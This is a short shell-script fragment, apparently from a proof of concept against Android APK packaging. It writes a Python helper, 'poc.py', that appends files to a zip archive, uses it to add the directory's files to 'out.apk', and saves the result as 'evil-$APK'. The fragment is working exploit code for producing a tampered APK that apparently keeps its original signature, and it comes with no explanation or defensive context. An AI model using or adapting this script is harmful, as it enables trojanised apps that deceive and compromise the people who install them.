    mv ../out.apk .
    cat >poc.py <<-EOF
    #!/usr/bin/python
    import zipfile
    import sys
    z = zipfile.ZipFile(sys.argv[1], "a")
    z.write(sys.argv[2])
    z.close()
    EOF
    chmod 755 poc.py
    for f in `find . -type f |egrep -v "(poc.py|out.apk)"` ; do ./poc.py out.apk "$f" ; done
    cp out.apk ../evil-$APK
